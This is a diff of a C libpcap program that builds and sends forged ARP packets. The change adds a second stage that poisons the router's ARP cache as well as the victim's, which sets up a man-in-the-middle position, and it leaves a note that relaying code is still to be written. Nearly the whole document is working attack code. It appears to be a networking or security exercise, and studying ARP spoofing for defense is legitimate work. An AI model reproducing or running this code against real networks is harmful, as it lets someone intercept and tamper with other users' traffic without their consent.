@@ -23,7 +23,7 @@ int eth0_MAC(unsigned char* mac){
 	if(sock == 0){
 		return success;
 	}
-	strcpy(ifr.ifr_name, "eth0");
+	strcpy(ifr.ifr_name, "ens33");
 	if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
 		success = 1;
 	if (success) memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
@@ -41,7 +41,7 @@ int eth0_IP(unsigned char* ipadd){
 		printf("socket error!\n");
 		return 0;
 	}
-	strcpy(ifr.ifr_name, "eth0");
+	strcpy(ifr.ifr_name, "ens33");
 	if(ioctl(sock,SIOCGIFADDR, &ifr) == 0){
 		sai = &ifr.ifr_ifru.ifru_addr;
 		memcpy(ipadd, &(sai->sin_addr.s_addr), 4);
@@ -179,11 +179,6 @@ int main(int argc, char* argv[]){
 	}
 	targetip[cnt] = chk;
 
-	// target ip (38-41)
-	for(i=0;i<4;i++){
-		arp_data[38+i] = targetip[i];
-	}
-
 	// open device eth0
 	if(device == NULL){
 		if( (device = pcap_lookupdev(ebuf)) == NULL){
@@ -197,6 +192,8 @@ int main(int argc, char* argv[]){
 		exit(-1);
 	}
 
+////////Spoofing Target/////////////////////////////////////////////////////////////
+
 	// source MAC (6-11)
 	if(eth0_MAC(&arp_data[6]) == 0){
 		printf("Error : Writing my MAC address at packet ! \n");
@@ -209,6 +206,11 @@ int main(int argc, char* argv[]){
 	if(gatewayIP(&arp_data[28]) == 0){
 		printf("Error : Can't read gateway address! \n");
 	}
+	// target ip (38-41)
+	for(i=0;i<4;i++){
+		arp_data[38+i] = targetip[i];
+	}
+
 	// generating ARP request for ask victim's MAC
 	if(make_request(req_data, targetip) == 0){
 		printf("Error : Making Request \n");
@@ -240,6 +242,7 @@ int main(int argc, char* argv[]){
 			}
 		}
 	}
+
 	if(res == -1){
 		printf("Error reading the packets: %s\n", pcap_geterr(pd));
 		return -1;
@@ -249,6 +252,79 @@ int main(int argc, char* argv[]){
 	if(pcap_sendpacket(pd,arp_data,42) != 0){
 		printf("Error : Sending request packet!\n");
 	}
+
+	printf("Spoofing %s Finished\n", argv[1]);
+
+////////Spoofing Target/////////////////////////////////////////////////////////////
+
+////////Spoofing Router/////////////////////////////////////////////////////////////
+
+/*
+	// source MAC (6-11)
+	if(eth0_MAC(&arp_data[6]) == 0){
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+	// sender MAC (22-27)
+	if(eth0_MAC(&arp_data[22]) == 0){
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+*/
+
+	// target ip (38-41)
+	if(gatewayIP(&arp_data[38]) == 0){
+		printf("Error : Can't read gateway address! \n");
+	}
+	// sender IP (28-31)  --  fake to router
+	for(i=0;i<4;i++){
+		arp_data[28+i] = targetip[i];
+	}
+	// generating ARP request for ask router's MAC
+	if(make_request(req_data, &arp_data[38]) == 0){
+		printf("Error : Making Request \n");
+	}
+	// send ARP request to router (broadcast)
+	if(pcap_sendpacket(pd,req_data,42) != 0){
+		printf("Error : Sending request packet!\n");
+	}
+	// receive ARP reply to get router's MAC
+	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
+		if(res == 0)
+		/* Timeout elapsed */
+			continue;
+		
+		// type check
+		if( ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0806 ){
+			// it's not ARP
+			continue;
+		}
+		else{ // It's ARP !
+			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){
+				if( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0] ){
+					for(i=0;i<6;i++){
+						arp_data[i] = pkt_data[6+i];
+						arp_data[32+i] = pkt_data[6+i];
+					}
+					break;
+				}
+			}
+		}
+	}
+
+	if(res == -1){
+		printf("Error reading the packets: %s\n", pcap_geterr(pd));
+		return -1;
+	}
+
+	// send ARP spoofing packet
+	if(pcap_sendpacket(pd,arp_data,42) != 0){
+		printf("Error : Sending request packet!\n");
+	}
+
+	printf("Spoofing Router Finished\n");
+
+////////Spoofing Router/////////////////////////////////////////////////////////////
+
+	// Now, I should write the relaying code
 
 	return 0;
 }
